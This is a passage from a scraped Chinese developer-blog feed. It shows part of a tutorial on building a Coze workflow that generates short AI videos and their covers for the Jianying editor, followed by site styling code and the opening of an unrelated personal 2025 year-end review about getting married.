<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/684de1a80ac048b188d66be8069dfadf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=xLNFR4kNLRFxaswucDx8aPV8qnc%3D" alt="image.png" loading="lazy"/></p>
<p>如果你也想做类似视频，速度码住跟练，文末送工作流中的文生图提示词和图生视频提示词哦~</p>
<h2 data-id="heading-1">2. 工作流搭建</h2>
<p>完整工作流如下：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0196857d918341a7a73585b7d2ee57b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=7DaW1ZOoiglO0qgAkGjH%2FgQjrHI%3D" alt="" loading="lazy"/></p>
<p>总体流程可以梳理如下：</p>
<ol>
<li>
<p>根据用户输入的主题生成视频文案</p>
</li>
<li>
<p>将文案切分为文案片段列表</p>
</li>
<li>
<p>合并文案列表片段得到符合语义的文案列表</p>
</li>
<li>
<p>对合并后的文案片段进行配音操作，获取每个配音片段的时间段</p>
</li>
<li>
<p>对合并后的文案片段进行文生图、图生视频操作</p>
</li>
<li>
<p>将前置节点生成的素材添加到剪映草稿中</p>
</li>
<li>
<p>生成视频封面</p>
</li>
<li>
<p>输出生成好的封面和剪映草稿</p>
</li>
</ol>
<p><strong>开始节点：</strong> 开始节点传入的参数是视频主题和背景音乐（.MP3）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2be8ba948f59465d911558f029063fab~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=aDK5rVtNKg3PQ71PycUTRVfW78E%3D" alt="" loading="lazy"/></p>
<p><strong>情绪放大镜文案(</strong> <strong>大模型</strong> <strong>)：</strong> 大模型节点，它的作用是根据主题生成视频文案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7128ecfdde49497da9176cdb71b9228a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=aRsYVDHRaoz50STI2eXJmnYUTf8%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-2">2.1. 封面生成</h3>
<p>封面搭建的完整链路如图：<strong>情绪放大镜文案(</strong> <strong>大模型</strong> <strong>)</strong> 节点结束后就分成了封面生成和视频制作两个分支，封面生成的流程比较简单，就三个节点，依次是根据前置节点文案生成文生图提示词，基于文生图提示词生成图片，封面组装。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/07e92a6646904f048fafe7c434d14617~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=QrTaUxEKNuVhXaAMegEmsCQKk8U%3D" alt="" loading="lazy"/></p>
<p><strong>大模型</strong> <strong>（生成绘制封面图的文生图提示词）：</strong> 这是一个大模型节点，模型选择了豆包系列，输入的参数是<strong>情绪放大镜文案(大模型)</strong> 节点生成的文案。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40ab8c88f10f45c7a9a0bc3a11d2205a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=6F6Tu%2BpIrGEGKf3T0iy%2BUAwAox8%3D" alt="" loading="lazy"/></p>
<p><strong>封面帧图像生成：</strong> 这是Coze内置的图像生成节点，采用Seedream4.0绘图模型，为了更贴近原版这边还上传了4张参考图。输入节点配置的是<strong>大模型</strong> <strong>（生成绘制封面图的文生图提示词）</strong> 节点生成的文生图提示词。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1a1d71d3cbf42d6a6e02060c02422f0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=jgxVfinX%2BqXcLxki5JBJxji0VWM%3D" alt="" loading="lazy"/></p>
<p><strong>画板：</strong> 画板节点的作用是将<strong>封面帧图像生成</strong>节点生成的图和<strong>开始节点</strong>传入的视频主题拼接为视频封面。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/31f06f3cb22f483d8be3ff96c75ff96e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=fMTLyv7zcgB5GLPPhziPMmpdtMs%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-3">2.2. 视频生成</h3>
<p><strong>口播稿分割：</strong> 这是一个插件节点，它的作用是将<strong>情绪放大镜文案(</strong> <strong>大模型</strong> <strong>)</strong> 节点生成的文案拆分为文案片段列表。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ff4a2a5ded614188b81ad5927c7e4812~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=8oXi%2Bqfh99JpdieqQLzEX4kpqC8%3D" alt="" loading="lazy"/></p>
<p><strong>合并文案（</strong> <strong>大模型</strong> <strong>）：</strong> 这个节点的作用是将<strong>口播稿分割</strong>节点输出的文案列表进行二次合并，这一步做不做都可以，我做这一步的原因是<strong>口播稿分割</strong>输出的文案片段太多了，很多小短句，一个小短句代表一个分镜视频，这个大模型节点是将前后小短句进行合并，避免分镜资源消耗太多。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/05abf89f26164214ac7835f2d6b5c86d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=oQTieyD7w2sYR5z63p6I%2BS7fYLM%3D" alt="" loading="lazy"/></p>
<p><strong>循环配音：</strong> 字幕生成完毕后就来到了配音生成环节，下面的节点就是将字幕列表传入循环，在循环中进行配音，并获取每段配音的时长。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a0ffb586ad64fdbbc0df52e3d5387c2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=7ra%2BODJqp7CywZOm0JYmOewEq%2Fk%3D" alt="" loading="lazy"/></p>
<p><strong>循环生图和生成图生视频提示词：循环配音</strong>结束后就来到了生图环节，依然是基于循环来进行生图和生成图生视频提示词。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d6cfb92316f04bf4b0c8b44e191e5bb0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=Bbapd3AGE%2BhRmjqG8XrL%2BnW9Q0I%3D" alt="" loading="lazy"/></p>
<p><strong>生图操作：</strong> 在循环中的生图我进行了3轮重试操作（处于Coze工作流健壮性考虑），同时用选择器做了循环轮数的控制。<strong>这里是一个Coze调试的小技巧，在需要多轮循环才能完成的工作流中，我们可以在循环体内部的末尾加一个选择器判断当前index轮数，下图中我的判断条件的index=4就结束循环，即生成5张图片，5个分镜。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6c040f1277704705872161577271e051~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=CgsE0eP4CPYi42x%2BUghLCRarLB8%3D" alt="" loading="lazy"/></p>
<p><strong>视频生成：</strong> 视频生成依旧用的循环体来生成视频，视频生成插件采用<strong>Coze内置视频生成插件。如果觉得视频生成成本太高，可以把这一步骤往后的节点都删除，即</strong> <strong>工作流</strong> <strong>只生成字幕、图片和图生视频提示词，你自己去视频生成软件（如豆包）生成视频后去剪映自己拼一下，这种做法可以把成本降到最低，缺点就是费一些时间。</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43daf34f72354886a2847e546f162174~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=0m4fEYIKeFLMuM3ZELrRRB8%2BBvY%3D" alt="" loading="lazy"/></p>
<p><strong>代码_信息组装：</strong> 在前面的节点中我们生成了音频、字幕、分镜等视频元素。本节点的作用是组装拼接前置要素生成适配剪映小助手需要的格式。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/671116cf36644fc994431cd32e3c6aaf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=BMrfwYvuVxZFI9ndgRFQU%2FFe1uM%3D" alt="" loading="lazy"/></p>
<p><strong>添加素材到剪映草稿：</strong> 这是最后的步骤，我们只需要将代码节点输出的音频、视频、字幕等数据依次添加到剪映小助手即可。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/77641d8e3b4f4667af0d778325a3560b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=MNvRiWmgu4IMavmQOr0P5oOf804%3D" alt="" loading="lazy"/></p>
<p><strong>结束：</strong> 结束节点接收的是最终的剪映草稿和封面图。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9ad5cd2f5c564e0bafd4b966fbf49193~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=2%2F6KyehCdouTq%2BhHPUoI2K%2FL3hw%3D" alt="" loading="lazy"/></p>
<p>以上就是整个工作流的完整流程拆解，动手能力强的读者可以跟着教程实践一遍。<strong>上述工作流已经被收录到了小肥肠共学群中，如果想直接获取工作流原件，可以加入社群后我拉你进空间直接学习使用。</strong></p>
<p>本工作流中的文生图和图生视频提示词模板限量30份，想要的可以666获取哦~</p>
<h2 data-id="heading-4">3. 结语</h2>
<p>以上就是利用Coze复刻百万赞视频的全流程拆解。 虽然我们演示的是<strong>情绪放大镜类型的视频</strong>，但这个工作流的底层逻辑——<strong>大模型</strong> <strong>生成文案 -&gt; 拆解分镜 -&gt; 批量生图 -&gt; 组装草稿</strong>，其实是通用的。你完全可以把它修改一下，应用到<strong>民间故事、历史科普、甚至是小说推文</strong>赛道中。</p>
<p><strong>如本次分享对你有帮助，麻烦一键三连支持一下小肥肠，我们下期再见~</strong></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fac62e6a2fcc4d7392958fa6f1d54fee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5ZCO56uv5bCP6IKl6IKg:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768483585&amp;x-signature=gw%2BTGX%2FJmO78GPgvwoRa6rXQh1s%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年度总结：人生重要阶段的一年]]></title>    <link>https://juejin.cn/post/7592833068223152174</link>    <guid>https://juejin.cn/post/7592833068223152174</guid>    <pubDate>2026-01-08T13:56:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592833068223152174" data-draft-id="7590128405350858752" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 年度总结：人生重要阶段的一年"/> <meta itemprop="keywords" content="前端,程序员,年终总结"/> <meta itemprop="datePublished" content="2026-01-08T13:56:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Setsuna_F_Seiei"/> <meta itemprop="url" content="https://juejin.cn/user/835284567854696"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 年度总结：人生重要阶段的一年
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/835284567854696/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Setsuna_F_Seiei
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T13:56:47.000Z" title="Thu Jan 08 2026 13:56:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"「";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"」";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"✓";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="rainbow">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#474949;color:#d1d9e1}.hljs-comment,.hljs-quote{color:#969896;font-style:italic}.hljs-addition,.hljs-keyword,.hljs-literal,.hljs-selector-tag,.hljs-type{color:#c9c}.hljs-number,.hljs-selector-attr,.hljs-selector-pseudo{color:#f99157}.hljs-doctag,.hljs-regexp,.hljs-string{color:#8abeb7}.hljs-built_in,.hljs-name,.hljs-section,.hljs-title{color:#b5bd68}.hljs-class .hljs-title,.hljs-selector-id,.hljs-template-variable,.hljs-variable{color:#fc6}.hljs-name,.hljs-section,.hljs-strong{font-weight:700}.hljs-bullet,.hljs-link,.hljs-meta,.hljs-subst,.hljs-symbol{color:#f99157}.hljs-deletion{color:#dc322f}.hljs-formula{background:#eee8d5}.hljs-attr,.hljs-attribute{color:#81a2be}.hljs-emphasis{font-style:italic}</style><p>2025 年对我来说是一年做出人生重大决定的一年，因为在这一年内领证结婚摆酒了，也算是结束了5年的爱情长跑，完成了人生一件大事了吧！</p>
<br/>
<h3 data-id="heading-0">忙碌的生活</h3>
<p>2025年最大的感受还是繁忙，首先是在年初的时候决定在春节前就把领证结婚还有迁户口的事情给落实掉，然后就是双方选定年底的日子联婚摆酒，因此从年头就开始收拾东西准备装修，然后是新屋入伙；年中就开始不断的在工作空余时间在忙着筹备年底摆酒的事情了，摆完酒就干脆趁着婚假和年假调休等一起休了几天顺带简单的广东省内游了几天。</p>
